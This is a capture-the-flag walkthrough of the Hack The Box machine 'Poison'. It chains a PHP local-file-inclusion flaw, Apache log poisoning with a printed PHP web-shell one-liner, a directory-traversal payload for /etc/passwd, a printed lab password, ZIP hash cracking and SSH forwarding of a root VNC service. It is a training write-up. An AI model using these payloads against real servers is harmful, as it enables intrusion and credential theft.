# Poison — From LFI to a Root VNC Session

> **Hack The Box | Linux | Medium**

**Target IP:** `10.129.1.254`
**Hostname:** `Poison`

---

## The Mission

**Poison** is a medium-difficulty Linux machine running **FreeBSD**. The attack begins with an exposed PHP file browser vulnerable to **Local File Inclusion (LFI)**.

The LFI allows access to sensitive files, while Apache log poisoning provides a path to remote command execution. Credentials discovered through the web application lead to SSH access as `charix`.

From there, a protected ZIP archive reveals a password reuse opportunity. Enumeration of local listening services then exposes a VNC service bound only to localhost. SSH port forwarding makes the service accessible, and the recovered secret allows authentication as `root`.

### Attack Chain

```text
LFI
 ↓
Apache Log Poisoning
 ↓
Web Shell / Command Execution
 ↓
Credential Disclosure
 ↓
SSH as charix
 ↓
Password Reuse
 ↓
VNC Secret
 ↓
SSH Port Forwarding
 ↓
Root VNC Session
```

---

# 01 — Recon: Finding the Doors

## Initial Nmap Scan

The target was first scanned across the standard TCP ports:

```text
Nmap scan report for 10.129.1.254
Host is up, received reset ttl 63 (0.25s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two services were immediately available:

* `22/tcp` — SSH
* `80/tcp` — HTTP

An all-port scan was continued in the background while service enumeration was performed.

---

## Service & Version Detection

The next scan focused on identifying the running services and versions:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
```

The service information confirmed that the target was running **FreeBSD**:

```text
Service Info: OS: FreeBSD
```

### Service Overview

| Port | Service | Version                    |
| ---- | ------- | -------------------------- |
| 22   | SSH     | OpenSSH 7.2                |
| 80   | HTTP    | Apache 2.4.29 / PHP 5.6.32 |

This was an important distinction from the typical Linux targets encountered during CTFs.

---

# 02 — Web Enumeration: The File Browser

Browsing the web application revealed a PHP page:

```text
http://10.129.1.254/browse.php
```

The page contained a file parameter:

```html
<form action="/browse.php" method="GET">
    Scriptname: <input type="text" name="file"><br>
    <input type="submit" value="Submit">
</form>
```

The application also referenced several PHP files:

```text
ini.php
info.php
listfiles.php
phpinfo.php
```

The presence of a user-controlled `file` parameter immediately made **Local File Inclusion (LFI)** worth investigating.

---

# 03 — LFI: Reading Files Outside the Web Root

The parameter was tested directly:

```text
http://10.129.1.254/browse.php?file=browse.php
```

LFI fuzzing was performed using FFUF:

```bash
ffuf -s -u 'http://10.129.1.254/browse.php?file=FUZZ' \
-w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ac
```

Among the tested payloads was a traversal sequence targeting `/etc/passwd`:

```text
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

The resulting request:

```text
http://10.129.1.254/browse.php?file=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

successfully returned the password file.

Among the discovered accounts was:

```text
charix
```

**LFI was confirmed.**

---

# 04 — Turning LFI into Code Execution

With LFI confirmed, the next objective was to determine whether local log files could be accessed.

Because the target was running Apache on FreeBSD, the Apache access log was tested:

```text
http://10.129.1.254/browse.php?file=/var/log/httpd-access.log
```

The idea was to use **Apache log poisoning**.

The HTTP request was first captured and the User-Agent was modified to contain PHP code:

```php
<?php system($_GET['cmd']); ?>
```

The poisoned request was then followed by accessing the Apache log through the vulnerable `file` parameter.

This allowed PHP code stored inside the log to be interpreted when the log was included through the vulnerable PHP application.

---

# 05 — Finding the Credential Trail

Further enumeration of the application's files revealed:

```text
listfiles.php
```

Accessing the page:

```text
http://10.129.1.254/browse.php?file=listfiles.php
```

revealed a particularly interesting file:

```text
pwdbackup.txt
```

The contents contained a password encoded multiple times using Base64.

The password was decoded repeatedly until the original credential was recovered:

```text
charix:Charix!2#4%6&8(0
```

### Recovered Credential

| Username | Password           |
| -------- | ------------------ |
| `charix` | `Charix!2#4%6&8(0` |

---

# 06 — SSH: From Web Access to User Shell

The recovered credentials were used to access the SSH service:

```text
charix@Poison:~ %
```

The user's home directory contained:

```text
secret.zip
user.txt
```

The user flag was therefore available from the `charix` home directory.

---

# 07 — The Locked ZIP

The next interesting file was:

```text
secret.zip
```

It was transferred to the attacking machine using SCP:

```bash
scp charix@10.129.1.254:/home/charix/secret.zip .
```

The archive was password protected:

```bash
unzip secret.zip
```

Output:

```text
[secret.zip] secret password:
```

The ZIP password hash was extracted using `zip2john`:

```bash
zip2john secret.zip > hash
```

John the Ripper was then used against the generated hash:

```bash
john hash
```

The notes document that this process took significant time before an important hint pointed toward **password reuse**.

The SSH password was reused as the ZIP password, allowing the archive to be opened and the secret to be recovered.

---

# 08 — Looking Behind the Firewall

With access as `charix`, local network services were enumerated using FreeBSD's `sockstat`:

```bash
sockstat -4 -l
```

Relevant output included:

```text
root     Xvnc   608  1  tcp4   127.0.0.1:5901   *:*
root     Xvnc   608  3  tcp4   127.0.0.1:5801   *:*
```

This revealed a significant finding:

```text
127.0.0.1:5901
```

A **VNC service was running locally as root**, but it was bound to localhost and therefore not directly reachable from the attacking machine.

---

# 09 — SSH Port Forwarding: Exposing the Hidden Service

SSH was used to forward the VNC service.

The documented command was:

```bash
ssh -R 5901:127.0.0.1:5901 naval0505@10.10.15.95
```

The forwarded service was then checked locally:

```bash
ss -tunlp | grep 5901
```

The local listener appeared as:

```text
tcp LISTEN 0 5 127.0.0.1:5901 0.0.0.0:* users:(("Xtigervnc",pid=2167,fd=9))
tcp LISTEN 0 5 [::1]:5901 [::]:* users:(("Xtigervnc",pid=2167,fd=10))
```

This made the previously internal VNC service accessible from the attacking machine.

---

# 10 — VNC: The Final Door

If the direct forwarding approach did not work, the notes also document a ProxyChains configuration using:

```text
socks4 127.0.0.1 8081
```

The VNC client was then launched through ProxyChains:

```bash
proxychains vncviewer 127.0.0.1:5901 -passwd secret
```

The recovered secret from the ZIP archive was used as the VNC password.

The connection resulted in a root shell:

```text
root@Poison:~ # whoami
root
```

---

# 11 — Rooted

Root access was confirmed with:

```bash
whoami
```

Output:

```text
root
```

The root flag was located at:

```text
/root/root.txt
```

**Root access was successfully obtained through the locally bound VNC service.**

---

# Attack Path — One Chain, End to End

```text
                         ┌──────────────────────┐
                         │   Poison - FreeBSD   │
                         └──────────┬───────────┘
                                    │
                              Nmap Enumeration
                                    │
                              ┌─────┴─────┐
                              │           │
                            SSH          HTTP
                              │           │
                              │      browse.php
                              │           │
                              │          LFI
                              │           │
                              │     /etc/passwd
                              │           │
                              │       charix
                              │           │
                              │    Apache Log Poison
                              │           │
                              │    Command Execution
                              │           │
                              │    listfiles.php
                              │           │
                              │    pwdbackup.txt
                              │           │
                              │    Base64 decoding
                              │           │
                              └─────┬─────┘
                                    │
                              charix credentials
                                    │
                                    v
                                  SSH
                                    │
                                    v
                              secret.zip
                                    │
                                    v
                             Password Reuse
                                    │
                                    v
                              Secret recovered
                                    │
                                    v
                              sockstat -4 -l
                                    │
                                    v
                         127.0.0.1:5901 VNC
                                    │
                                    v
                           SSH Port Forwarding
                                    │
                                    v
                              VNC Connection
                                    │
                                    v
                                  ROOT
```

---

# What Poison Teaches

### 1. LFI Can Be More Than File Reading

A file inclusion vulnerability can become significantly more powerful when attacker-controlled data can be introduced into a file that is subsequently included.

### 2. Know Your Target's Operating System

The target was running **FreeBSD**, which changed the expected locations and tools used during enumeration.

For example:

```text
/var/log/httpd-access.log
```

was used for Apache log enumeration.

### 3. Credentials Hide in Application Files

Files such as:

```text
pwdbackup.txt
```

can expose credentials that completely change the attack path.

### 4. Password Reuse Matters

The recovered SSH password was also used as the password for the protected ZIP archive.

This demonstrated why password reuse can turn one compromised credential into access to additional protected resources.

### 5. Enumerate Local Services

`sockstat` revealed services that were not visible from the external Nmap scan.

The VNC service was bound to:

```text
127.0.0.1:5901
```

which meant external enumeration alone would not have exposed it.

### 6. Port Forwarding Is Essential

A service restricted to localhost is not necessarily inaccessible.

SSH forwarding can make internal services reachable from an attacker's machine when valid SSH access is available.

---

# Tools Used

* Nmap
* FFUF
* Burp Suite
* SCP
* SSH
* zip2john
* John the Ripper
* sockstat
* ProxyChains
* VNC Viewer
* Base64 decoding / CyberChef

---

# Final Takeaway

**Poison** is a great example of how several individually manageable weaknesses can be chained into a complete compromise.

The path started with a vulnerable PHP file browser and LFI, progressed through Apache log poisoning to command execution, and then moved to SSH using credentials recovered from the application's files.

Once authenticated as `charix`, local service enumeration revealed a root-owned VNC service that was hidden behind the localhost interface. The recovered secret from the protected ZIP archive provided the final piece needed to access that service.

The final chain was:

```text
LFI
→ Log Poisoning
→ Command Execution
→ Credential Discovery
→ SSH
→ Password Reuse
→ Local VNC Enumeration
→ Port Forwarding
→ Root
```

**The biggest lesson: never stop enumerating after obtaining a shell. The services that are invisible externally may be exactly where the final privilege escalation is hiding.**
